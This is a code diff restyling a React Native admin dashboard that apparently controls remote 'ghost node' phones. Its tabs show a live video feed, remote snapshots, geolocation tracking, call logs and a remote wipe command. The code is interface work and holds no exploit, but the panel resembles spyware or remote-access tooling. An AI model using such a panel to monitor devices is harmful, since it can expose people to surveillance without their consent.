@@ -27,11 +27,9 @@ const AdminScreen = ({ onLogout, name }) => {
 
   useEffect(() => {
     socket.on('heartbeat_update', (data) => {
-      // Performance Throttle: Update cache, update state only on interval or small batch
       heartbeatCache.current[data.name] = { ...data, lastSeen: Date.now() };
     });
 
-    // Dedicated performance loop for state syncing (Reduce re-renders)
     const syncInterval = setInterval(() => {
       if (Object.keys(heartbeatCache.current).length > 0) {
         setGhosts(prev => {
@@ -39,11 +37,11 @@ const AdminScreen = ({ onLogout, name }) => {
           Object.keys(heartbeatCache.current).forEach(node => {
             newState[node] = { ...prev[node], ...heartbeatCache.current[node] };
           });
-          heartbeatCache.current = {}; // Flush cache
+          heartbeatCache.current = {}; 
           return newState;
         });
       }
-    }, 800); // Sync every 800ms for visual smoothness vs performance balance
+    }, 800); 
     
     socket.on('status_report', (data) => {
       console.log("[Admin] Received Status Report", data);
@@ -131,20 +129,20 @@ const AdminScreen = ({ onLogout, name }) => {
   };
 
   const captureLocalView = async (targetRef, typeLabel = "DASHBOARD") => {
-    if (isCapturing) return; // Prevention: No double-capture
+    if (isCapturing) return;
 
     try {
-      setIsCapturing(true); // Tactical Delay Active
+      setIsCapturing(true); 
       const { status } = await MediaLibrary.requestPermissionsAsync();
       if (status !== 'granted') {
-        Alert.alert("Permission", "Storage access required to save screenshot.");
+        Alert.alert("Permission Error", "Storage access required to save screenshot.");
         return;
       }
 
       const captureTarget = (targetRef && targetRef.current) ? targetRef : viewRef;
       const uri = await captureRef(captureTarget, {
         format: 'jpg',
-        quality: 0.95, // High quality as requested
+        quality: 0.95,
       });
 
       const nodeInfo = selectedGhost ? selectedGhost.name.replace(/[^a-z0-9]/gi, '_').toUpperCase() : 'NONE';
@@ -154,9 +152,8 @@ const AdminScreen = ({ onLogout, name }) => {
       await MediaLibrary.createAlbumAsync('JOYJET_SCREENSHOTS', asset, false);
       
       Vibration.vibrate([0, 50, 50, 50]);
-      Alert.alert(`${typeLabel} PRESERVED`, `Manifest: ${filename}`);
+      Alert.alert(`SUCCESS`, `Preserved as: ${filename}`);
       
-      // Cooldown timer to prevent storage/CPU bottleneck
       setTimeout(() => setIsCapturing(false), 2000); 
     } catch (e) {
       console.error("Local capture failed", e);
@@ -165,22 +162,130 @@ const AdminScreen = ({ onLogout, name }) => {
     }
   };
 
+  const renderContent = () => {
+    switch (activeTab) {
+      case 'FEED':
+        return (
+          <View style={styles.tabSection}>
+            <View style={styles.card}>
+              <View style={styles.cardHeader}>
+                <Text style={styles.sectionLabel}>LIVE INTELLIGENCE STREAM</Text>
+                <View style={styles.liveBadge}><Text style={styles.liveBadgeText}>LIVE</Text></View>
+              </View>
+              
+              <View ref={feedRef} collapsable={false} style={styles.feedWrapper}>
+                <VideoFeed ghostName={selectedGhost.name} adminName={name} />
+              </View>
+
+              <View style={styles.controls}>
+                <TouchableOpacity 
+                  style={[styles.primaryBtn, isCapturing && styles.disabledBtn]} 
+                  onPress={() => captureLocalView(feedRef, "FEED")}
+                  disabled={isCapturing}
+                >
+                  <MaterialCommunityIcons name="monitor-screenshot" size={20} color="#0F172A" style={{ marginRight: 8 }} />
+                  <Text style={styles.primaryBtnTxt}>{isCapturing ? "PRESERVING..." : "CAPTURE FEED"}</Text>
+                </TouchableOpacity>
+                <View style={styles.rowControls}>
+                  <TouchableOpacity style={[styles.secondaryBtn, {flex: 1, marginRight: 8}]} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
+                    <MaterialCommunityIcons name="camera-iris" size={20} color="#38BDF8" style={{ marginRight: 8 }} />
+                    <Text style={styles.secondaryBtnTxt}>REMOTE SNAP</Text>
+                  </TouchableOpacity>
+
+                  <TouchableOpacity style={[styles.dangerBtn, {flex: 1}]} onPress={() => sendCommand(selectedGhost.name, 'WIPE')}>
+                    <MaterialCommunityIcons name="alert-octagon" size={20} color="#EF4444" style={{ marginRight: 8 }} />
+                    <Text style={styles.dangerBtnTxt}>WIPE NODE</Text>
+                  </TouchableOpacity>
+                </View>
+              </View>
+            </View>
+          </View>
+        );
+      case 'MAP':
+        return (
+          <View style={styles.tabSection}>
+            <View style={styles.card}>
+              <View style={styles.cardHeader}>
+                <Text style={styles.sectionLabel}>GEOLOCATION TRACKING</Text>
+              </View>
+              <TacticalMap location={selectedGhost.location} ghostName={selectedGhost.name} />
+              <TouchableOpacity style={[styles.secondaryBtn, { marginTop: 16 }]} onPress={() => sendCommand(selectedGhost.name, 'PING')}>
+                <MaterialCommunityIcons name="radar" size={20} color="#38BDF8" style={{ marginRight: 8 }} />
+                <Text style={styles.secondaryBtnTxt}>FORCE UPDATE LOCATION</Text>
+              </TouchableOpacity>
+            </View>
+          </View>
+        );
+      case 'SNAPS':
+        return (
+          <View style={styles.tabSection}>
+            <View style={styles.card}>
+              <View style={styles.cardHeader}>
+                <Text style={styles.sectionLabel}>EVIDENCE GALLERY</Text>
+              </View>
+              <SnapshotGallery ghostName={selectedGhost.name} snapshots={selectedGhost.snapshots || []} />
+              <TouchableOpacity style={[styles.primaryBtn, { marginTop: 16 }]} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
+                <MaterialCommunityIcons name="camera-plus" size={20} color="#0F172A" style={{ marginRight: 8 }} />
+                <Text style={styles.primaryBtnTxt}>REQUEST NEW REMOTE CAPTURE</Text>
+              </TouchableOpacity>
+            </View>
+          </View>
+        );
+      case 'CALLS':
+        return (
+          <View style={styles.tabSection}>
+            <View style={styles.card}>
+              <CallLogViewer logs={selectedGhost.callLogs || []} />
+              <TouchableOpacity style={[styles.secondaryBtn, { marginTop: 16 }]} onPress={() => sendCommand(selectedGhost.name, 'LOG_SYNC')}>
+                <MaterialCommunityIcons name="sync" size={20} color="#38BDF8" style={{ marginRight: 8 }} />
+                <Text style={styles.secondaryBtnTxt}>FORCE SYNC TELEMETRY</Text>
+              </TouchableOpacity>
+            </View>
+          </View>
+        );
+      case 'LOGS':
+        return (
+          <View style={styles.tabSection}>
+            <View style={[styles.card, { height: 450 }]}>
+                <LogConsole logs={logs.filter(l => l.message.includes(selectedGhost.name) || l.type === 'SYSTEM')} />
+            </View>
+          </View>
+        );
+      default:
+        return null;
+    }
+  };
+
   return (
     <SafeAreaView style={styles.container} ref={viewRef} collapsable={false}>
-      <StatusBar barStyle="light-content" />
+      <StatusBar barStyle="light-content" backgroundColor="#0F172A" />
       
+      {/* HEADER */}
       <View style={styles.header}>
-        <Text style={styles.headerTitle}>JOYJET HUB / COMMAND CENTER</Text>
+        <View style={styles.headerLeft}>
+          <View style={styles.logoIcon}>
+            <MaterialCommunityIcons name="shield-check" size={20} color="#38BDF8" />
+          </View>
+          <View>
+            <Text style={styles.headerTitle}>COMMAND CENTER</Text>
+            <Text style={styles.headerSubtitle}>SECURE DIRECT CONNECT</Text>
+          </View>
+        </View>
         <TouchableOpacity style={styles.logoutBtn} onPress={onLogout}>
-          <Text style={styles.logoutTxt}>[ LOGOUT ]</Text>
+          <MaterialCommunityIcons name="logout-variant" size={16} color="#EF4444" style={{marginRight: 6}} />
+          <Text style={styles.logoutTxt}>DISCONNECT</Text>
         </TouchableOpacity>
       </View>
 
       {/* GHOST SELECTOR */}
       <View style={styles.selectorContainer}>
+        <Text style={styles.sectionHeading}>ACTIVE NODES</Text>
         <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.selectorScroll}>
           {Object.values(ghosts).length === 0 ? (
-            <Text style={styles.emptyText}>NO ACTIVE NODES DETECTED</Text>
+            <View style={styles.emptyGhostContainer}>
+              <ActivityIndicator color="#64748B" size="small" style={{marginRight: 8}} />
+              <Text style={styles.emptyText}>SCANNING FOR SIGNALS...</Text>
+            </View>
           ) : (
             Object.values(ghosts).map((ghost) => (
               <TouchableOpacity 
@@ -211,108 +316,75 @@ const AdminScreen = ({ onLogout, name }) => {
           {/* TAB NAVIGATION */}
           <View style={styles.tabBar}>
             <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.tabScroll}>
-              {['FEED', 'MAP', 'SNAPS', 'CALLS', 'LOGS'].map(tab => (
+              {[
+                { id: 'FEED', icon: 'cctv' },
+                { id: 'MAP', icon: 'map-marker-radius' },
+                { id: 'SNAPS', icon: 'image-multiple' },
+                { id: 'CALLS', icon: 'phone-log' },
+                { id: 'LOGS', icon: 'console-line' }
+              ].map(tab => (
                 <TouchableOpacity 
-                  key={tab} 
-                  style={[styles.tab, activeTab === tab && styles.tabActive]}
-                  onPress={() => setActiveTab(tab)}
+                  key={tab.id} 
+                  style={[styles.tab, activeTab === tab.id && styles.tabActive]}
+                  onPress={() => setActiveTab(tab.id)}
                 >
-                  <Text style={[styles.tabText, activeTab === tab && styles.tabTextActive]}>{tab}</Text>
+                  <MaterialCommunityIcons 
+                    name={tab.icon} 
+                    size={18} 
+                    color={activeTab === tab.id ? '#38BDF8' : '#64748B'} 
+                    style={{ marginBottom: 4 }} 
+                  />
+                  <Text style={[styles.tabText, activeTab === tab.id && styles.tabTextActive]}>{tab.id}</Text>
                 </TouchableOpacity>
               ))}
             </ScrollView>
           </View>
 
           {/* TAB CONTENT */}
-          <ScrollView style={styles.content}>
-            <View style={styles.ghostInfoHead}>
-              <Text style={styles.ghostIdText}>GHOST :: {selectedGhost.name.toUpperCase()}</Text>
-              <Text style={styles.vitals}>{selectedGhost.battery || '--'}</Text>
+          <ScrollView style={styles.content} showsVerticalScrollIndicator={false}>
+            {/* Vitals Overview */}
+            <View style={styles.vitalsContainer}>
+              <View style={styles.vitalLeft}>
+                <MaterialCommunityIcons name="cellphone-link" size={24} color="#F8FAFC" style={{marginRight: 10}} />
+                <View>
+                  <Text style={styles.ghostIdText}>{selectedGhost?.name.toUpperCase()}</Text>
+                  <Text style={styles.vitalSub}>NODE ID • SECURE</Text>
+                </View>
+              </View>
+              <StatusCard 
+                battery={selectedGhost?.battery || '--%'} 
+                connection={selectedGhost?.status || 'UNKNOWN'}
+                isCharging={selectedGhost?.isCharging} 
+              />
             </View>
 
-            {activeTab === 'FEED' && (
-              <View style={styles.tabSection}>
-                <View style={styles.card}>
-                  <Text style={styles.sectionLabel}>LIVE INTELLIGENCE STREAM</Text>
-                  <View ref={feedRef} collapsable={false} style={{ backgroundColor: '#000', borderRadius: 4, overflow: 'hidden' }}>
-                    <VideoFeed ghostName={selectedGhost.name} adminName={name} />
-                  </View>
-                  <View style={styles.controls}>
-                    <TouchableOpacity 
-                      style={[styles.btn, isCapturing && { opacity: 0.5 }]} 
-                      onPress={() => captureLocalView(feedRef, "FEED")}
-                      disabled={isCapturing}
-                    >
-                      <MaterialCommunityIcons name="camera-plus" size={18} color="#00ff00" style={{ marginRight: 10 }} />
-                      <Text style={styles.btnTxt}>{isCapturing ? "PRESERVING..." : "CAPTURE LIVE FEED"}</Text>
-                    </TouchableOpacity>
-                    
-                    <TouchableOpacity style={[styles.btn]} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
-                      <MaterialCommunityIcons name="camera-iris" size={18} color="#00ff00" style={{ marginRight: 10 }} />
-                      <Text style={styles.btnTxt}>REMOTE HIGH-RES SNAP</Text>
-                    </TouchableOpacity>
+            {renderContent()}
 
-                    <TouchableOpacity style={[styles.btn, styles.wipeBtn]} onPress={() => sendCommand(selectedGhost.name, 'WIPE')}>
-                      <MaterialCommunityIcons name="skull-outline" size={18} color="#ff4444" style={{ marginRight: 10 }} />
-                      <Text style={styles.wipeBtnTxt}>EMERGENCY WIPE</Text>
-                    </TouchableOpacity>
-                  </View>
-                </View>
-              </View>
-            )}
-
-            {activeTab === 'MAP' && (
-              <View style={styles.tabSection}>
-                <View style={[styles.card, { padding: 0, overflow: 'hidden', height: 450 }]}>
-                    <TacticalMap location={selectedGhost.location} ghostName={selectedGhost.name} />
-                    <TouchableOpacity style={[styles.btn, { position: 'absolute', bottom: 15, right: 15, width: 140, height: 40, backgroundColor: '#000' }]} onPress={() => sendCommand(selectedGhost.name, 'PING')}>
-                      <Text style={styles.btnTxt}>FORCED LOCATE</Text>
-                    </TouchableOpacity>
-                </View>
-              </View>
-            )}
-
-            {activeTab === 'SNAPS' && (
-              <View style={styles.tabSection}>
-                <View style={styles.card}>
-                  <Text style={styles.sectionLabel}>REMOTE EVIDENCE GALLERY</Text>
-                  <SnapshotGallery ghostName={selectedGhost.name} snapshots={selectedGhost.snapshots || []} />
-                  <TouchableOpacity style={[styles.btn, { marginTop: 15 }]} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
-                    <MaterialCommunityIcons name="camera-plus" size={18} color="#00ff00" style={{ marginRight: 10 }} />
-                    <Text style={styles.btnTxt}>NEW REMOTE CAPTURE</Text>
-                  </TouchableOpacity>
-                </View>
-              </View>
-            )}
-
-            {activeTab === 'CALLS' && (
-              <View style={styles.tabSection}>
-                <View style={styles.card}>
-                  <Text style={styles.sectionLabel}>CALL LOG MANIFEST</Text>
-                  <CallLogViewer logs={selectedGhost.callLogs || []} />
-                  <TouchableOpacity style={[styles.btn, { marginTop: 15 }]} onPress={() => sendCommand(selectedGhost.name, 'LOG_SYNC')}>
-                    <Text style={styles.btnTxt}>SYNC TELEMETRY</Text>
-                  </TouchableOpacity>
-                </View>
-              </View>
-            )}
-
-            {activeTab === 'LOGS' && (
-              <View style={styles.tabSection}>
-                <View style={[styles.card, { height: 400 }]}>
-                    <Text style={styles.sectionLabel}>SYSTEM LOG TERMINAL</Text>
-                    <LogConsole logs={logs.filter(l => l.message.includes(selectedGhost.name) || l.type === 'SYSTEM')} />
-                </View>
-              </View>
-            )}
+            <View style={{ height: 40 }} />
           </ScrollView>
         </>
       ) : (
         <View style={styles.initOverlay}>
-          <View style={styles.card}>
-            <ActivityIndicator color="#00ff00" size="large" />
-            <Text style={styles.initText}>SELECT A GHOST NODE TO INITIALIZE STREAM</Text>
-            <View style={{ height: 250, width: '100%', borderTopWidth: 1, borderTopColor: '#111' }}>
+          <View style={styles.placeholderCard}>
+            {Object.keys(ghosts).length === 0 ? (
+              <>
+                <View style={styles.iconCirclePulse}>
+                  <ActivityIndicator color="#38BDF8" size="large" />
+                </View>
+                <Text style={styles.initTitle}>AWAITING CONNECTIONS</Text>
+                <Text style={styles.initDesc}>No ghost nodes are currently active. Ensure the client applications are running and connected to the network.</Text>
+              </>
+            ) : (
+              <>
+                <View style={[styles.iconCirclePulse, { backgroundColor: 'rgba(16, 185, 129, 0.1)', borderColor: 'rgba(16, 185, 129, 0.3)' }]}>
+                  <MaterialCommunityIcons name="gesture-tap" size={48} color="#10B981" />
+                </View>
+                <Text style={styles.initTitle}>SELECT A NODE</Text>
+                <Text style={styles.initDesc}>Tap on any active node from the sequence above to start monitoring its secure stream and telemetry.</Text>
+              </>
+            )}
+            
+            <View style={styles.logPreviewBox}>
               <LogConsole logs={logs} />
             </View>
           </View>
@@ -323,81 +395,95 @@ const AdminScreen = ({ onLogout, name }) => {
 };
 
 const styles = StyleSheet.create({
-  container: { flex: 1, backgroundColor: '#000' },
+  container: { flex: 1, backgroundColor: '#0F172A' },
+  
+  // Header
   header: { 
-    paddingTop: 45, // Fix for Status Bar
-    paddingBottom: 15, 
+    paddingTop: 50, 
+    paddingBottom: 16, 
     paddingHorizontal: 20, 
     flexDirection: 'row', 
     justifyContent: 'space-between', 
     alignItems: 'center', 
-    backgroundColor: '#050505', 
+    backgroundColor: '#1E293B', 
     borderBottomWidth: 1, 
-    borderBottomColor: '#111' 
+    borderBottomColor: '#334155' 
   },
-  headerTitle: { color: '#fff', fontSize: 10, letterSpacing: 5 },
-  logoutBtn: { paddingHorizontal: 12, paddingVertical: 4, borderWidth: 0.5, borderColor: '#ff4444', borderRadius: 3 },
-  logoutTxt: { color: '#ff4444', fontSize: 7, letterSpacing: 2 },
+  headerLeft: { flexDirection: 'row', alignItems: 'center' },
+  logoIcon: { width: 36, height: 36, borderRadius: 8, backgroundColor: '#0F172A', justifyContent: 'center', alignItems: 'center', marginRight: 12, borderWidth: 1, borderColor: '#334155' },
+  headerTitle: { color: '#F8FAFC', fontSize: 16, fontWeight: '800', letterSpacing: 1 },
+  headerSubtitle: { color: '#38BDF8', fontSize: 10, fontWeight: '600', letterSpacing: 1.5, marginTop: 2 },
+  
+  logoutBtn: { flexDirection: 'row', alignItems: 'center', paddingHorizontal: 12, paddingVertical: 8, backgroundColor: 'rgba(239, 68, 68, 0.1)', borderWidth: 1, borderColor: 'rgba(239, 68, 68, 0.3)', borderRadius: 20 },
+  logoutTxt: { color: '#EF4444', fontSize: 10, fontWeight: '700', letterSpacing: 1 },
   
   // Ghost Selector
-  selectorContainer: { backgroundColor: '#080808', borderBottomWidth: 1, borderBottomColor: '#111' },
-  selectorScroll: { padding: 10, gap: 10 },
-  selectorChip: { flexDirection: 'row', alignItems: 'center', paddingHorizontal: 15, paddingVertical: 8, backgroundColor: '#000', borderWidth: 1, borderColor: '#222', borderRadius: 20 },
-  selectorChipActive: { borderColor: '#00ff00', backgroundColor: '#00ff0011' },
-  selectorText: { color: '#444', fontSize: 10, fontWeight: 'bold' },
-  selectorTextActive: { color: '#00ff00' },
-  dot: { width: 6, height: 6, borderRadius: 3, marginRight: 8 },
-  dotGreen: { backgroundColor: '#00ff00' },
-  dotOrange: { backgroundColor: '#ffaa00' },
-  dotRed: { backgroundColor: '#ff4444' },
-  selectorChipOffline: { borderColor: '#333', opacity: 0.5 },
-  selectorTextOffline: { color: '#333' },
-  emptyText: { color: '#222', fontSize: 9, letterSpacing: 2, padding: 5 },
+  selectorContainer: { backgroundColor: '#0B0F19', borderBottomWidth: 1, borderBottomColor: '#1E293B', paddingVertical: 12 },
+  sectionHeading: { color: '#64748B', fontSize: 10, fontWeight: '700', letterSpacing: 1.5, marginLeft: 20, marginBottom: 8 },
+  selectorScroll: { paddingHorizontal: 20, gap: 12 },
+  emptyGhostContainer: { flexDirection: 'row', alignItems: 'center', backgroundColor: '#1E293B', paddingHorizontal: 16, paddingVertical: 10, borderRadius: 24, borderWidth: 1, borderColor: '#334155' },
+  emptyText: { color: '#94A3B8', fontSize: 11, fontWeight: '600', letterSpacing: 1 },
+  
+  selectorChip: { flexDirection: 'row', alignItems: 'center', paddingHorizontal: 16, paddingVertical: 10, backgroundColor: '#1E293B', borderWidth: 1, borderColor: '#334155', borderRadius: 24, shadowColor: '#000', shadowOffset: {width:0, height:2}, shadowOpacity: 0.2, shadowRadius: 3, elevation: 3 },
+  selectorChipActive: { borderColor: '#38BDF8', backgroundColor: 'rgba(56, 189, 248, 0.1)' },
+  selectorText: { color: '#94A3B8', fontSize: 12, fontWeight: '700', letterSpacing: 0.5 },
+  selectorTextActive: { color: '#38BDF8' },
+  
+  dot: { width: 8, height: 8, borderRadius: 4, marginRight: 10 },
+  dotGreen: { backgroundColor: '#10B981', shadowColor: '#10B981', shadowOffset: {width:0, height:0}, shadowOpacity: 0.8, shadowRadius: 4, elevation: 4 },
+  dotOrange: { backgroundColor: '#F59E0B' },
+  dotRed: { backgroundColor: '#EF4444' },
+  
+  selectorChipOffline: { borderColor: '#1E293B', backgroundColor: '#0F172A', opacity: 0.6 },
+  selectorTextOffline: { color: '#64748B' },
 
   // Tabs
-  tabBar: { backgroundColor: '#050505', borderBottomWidth: 1, borderBottomColor: '#111' },
+  tabBar: { backgroundColor: '#1E293B', borderBottomWidth: 1, borderBottomColor: '#334155' },
   tabScroll: { flexDirection: 'row' },
-  tab: { paddingHorizontal: 20, paddingVertical: 12, alignItems: 'center', borderBottomWidth: 2, borderBottomColor: 'transparent' },
-  tabActive: { borderBottomColor: '#00ff00' },
-  tabText: { color: '#444', fontSize: 9, fontWeight: 'bold', letterSpacing: 1 },
-  tabTextActive: { color: '#00ff00' },
+  tab: { flex: 1, minWidth: 80, paddingVertical: 12, alignItems: 'center', borderBottomWidth: 2, borderBottomColor: 'transparent' },
+  tabActive: { borderBottomColor: '#38BDF8' },
+  tabText: { color: '#64748B', fontSize: 10, fontWeight: '700', letterSpacing: 1 },
+  tabTextActive: { color: '#38BDF8' },
 
   // Content
   content: { flex: 1 },
-  ghostInfoHead: { flexDirection: 'row', justifyContent: 'space-between', padding: 15, backgroundColor: '#020202' },
-  ghostIdText: { color: '#666', fontSize: 10, fontWeight: 'bold' },
-  vitals: { color: '#00ff00', fontSize: 10, fontWeight: 'bold' },
-  tabSection: { padding: 15 },
-  sectionLabel: { color: '#333', fontSize: 9, fontWeight: 'bold', marginBottom: 15, letterSpacing: 1 },
+  vitalsContainer: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', padding: 16, backgroundColor: '#1E293B', borderBottomWidth: 1, borderBottomColor: '#334155' },
+  vitalLeft: { flexDirection: 'row', alignItems: 'center' },
+  ghostIdText: { color: '#F8FAFC', fontSize: 14, fontWeight: '800', letterSpacing: 1 },
+  vitalSub: { color: '#64748B', fontSize: 10, fontWeight: '600', letterSpacing: 1, marginTop: 2 },
+  
+  tabSection: { padding: 16 },
+  
+  // Cards
+  card: { backgroundColor: '#1E293B', borderRadius: 16, padding: 16, borderWidth: 1, borderColor: '#334155', shadowColor: '#000', shadowOffset: { width: 0, height: 4 }, shadowOpacity: 0.2, shadowRadius: 8, elevation: 5 },
+  cardHeader: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12 },
+  sectionLabel: { color: '#94A3B8', fontSize: 11, fontWeight: '700', letterSpacing: 1.5 },
+  liveBadge: { backgroundColor: 'rgba(239, 68, 68, 0.1)', paddingHorizontal: 8, paddingVertical: 4, borderRadius: 12, borderWidth: 1, borderColor: 'rgba(239, 68, 68, 0.3)' },
+  liveBadgeText: { color: '#EF4444', fontSize: 9, fontWeight: '800', letterSpacing: 1 },
+  
+  feedWrapper: { borderRadius: 12, overflow: 'hidden', backgroundColor: '#0F172A', borderWidth: 1, borderColor: '#334155' },
   
   // Controls
-  controls: { marginTop: 15, gap: 10 },
-  btn: { width: '100%', height: 48, borderWidth: 1, borderColor: '#00ff00', flexDirection: 'row', justifyContent: 'center', alignItems: 'center', borderRadius: 4, backgroundColor: '#00ff0005' },
-  btnTxt: { color: '#00ff00', fontSize: 10, fontWeight: 'bold', letterSpacing: 2 },
-  wipeBtn: { borderColor: '#ff4444', backgroundColor: '#ff444405' },
-  wipeBtnTxt: { color: '#ff4444', fontSize: 10, fontWeight: 'bold', letterSpacing: 2 },
+  controls: { marginTop: 16, gap: 12 },
+  rowControls: { flexDirection: 'row', justifyContent: 'space-between' },
   
-  // Placeholders
-  snapPlaceholder: { height: 200, backgroundColor: '#030303', borderWidth: 1, borderColor: '#111', borderRadius: 5, justifyContent: 'center', alignItems: 'center', marginBottom: 15 },
-  placeholderText: { color: '#111', fontSize: 10, fontWeight: 'bold' },
-
-  // Init State
-  initOverlay: { flex: 1, justifyContent: 'center', padding: 20 },
-  initText: { color: '#00ff00', fontSize: 9, fontWeight: 'bold', letterSpacing: 2, marginTop: 20, marginBottom: 20, textAlign: 'center' },
-
-  card: {
-    backgroundColor: '#050505',
-    borderWidth: 1,
-    borderColor: '#111',
-    borderRadius: 8,
-    padding: 15,
-    width: '100%',
-    shadowColor: '#00ff00',
-    shadowOffset: { width: 0, height: 4 },
-    shadowOpacity: 0.1,
-    shadowRadius: 10,
-    elevation: 10
-  }
+  primaryBtn: { height: 50, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', borderRadius: 25, backgroundColor: '#38BDF8', shadowColor: '#38BDF8', shadowOffset: { width: 0, height: 4 }, shadowOpacity: 0.3, shadowRadius: 8, elevation: 4 },
+  primaryBtnTxt: { color: '#0F172A', fontSize: 12, fontWeight: '800', letterSpacing: 1.5 },
+  disabledBtn: { backgroundColor: '#64748B', shadowOpacity: 0 },
+  
+  secondaryBtn: { height: 46, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', borderRadius: 23, backgroundColor: 'rgba(56, 189, 248, 0.1)', borderWidth: 1, borderColor: 'rgba(56, 189, 248, 0.3)' },
+  secondaryBtnTxt: { color: '#38BDF8', fontSize: 11, fontWeight: '700', letterSpacing: 1 },
+  
+  dangerBtn: { height: 46, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', borderRadius: 23, backgroundColor: 'rgba(239, 68, 68, 0.1)', borderWidth: 1, borderColor: 'rgba(239, 68, 68, 0.3)' },
+  dangerBtnTxt: { color: '#EF4444', fontSize: 11, fontWeight: '700', letterSpacing: 1 },
+  
+  // Init Overlay
+  initOverlay: { flex: 1, padding: 20, justifyContent: 'center' },
+  placeholderCard: { backgroundColor: '#1E293B', borderRadius: 20, padding: 24, alignItems: 'center', borderWidth: 1, borderColor: '#334155', shadowColor: '#000', shadowOffset: { width: 0, height: 8 }, shadowOpacity: 0.3, shadowRadius: 12, elevation: 10 },
+  iconCirclePulse: { width: 80, height: 80, borderRadius: 40, backgroundColor: 'rgba(56, 189, 248, 0.1)', borderWidth: 1, borderColor: 'rgba(56, 189, 248, 0.3)', justifyContent: 'center', alignItems: 'center', marginBottom: 20 },
+  initTitle: { color: '#F8FAFC', fontSize: 18, fontWeight: '800', letterSpacing: 1.5, marginBottom: 8, textAlign: 'center' },
+  initDesc: { color: '#94A3B8', fontSize: 13, textAlign: 'center', lineHeight: 20, marginBottom: 24, paddingHorizontal: 10 },
+  logPreviewBox: { height: 200, width: '100%', borderRadius: 12, overflow: 'hidden', borderWidth: 1, borderColor: '#334155' }
 });
 
 export default AdminScreen;
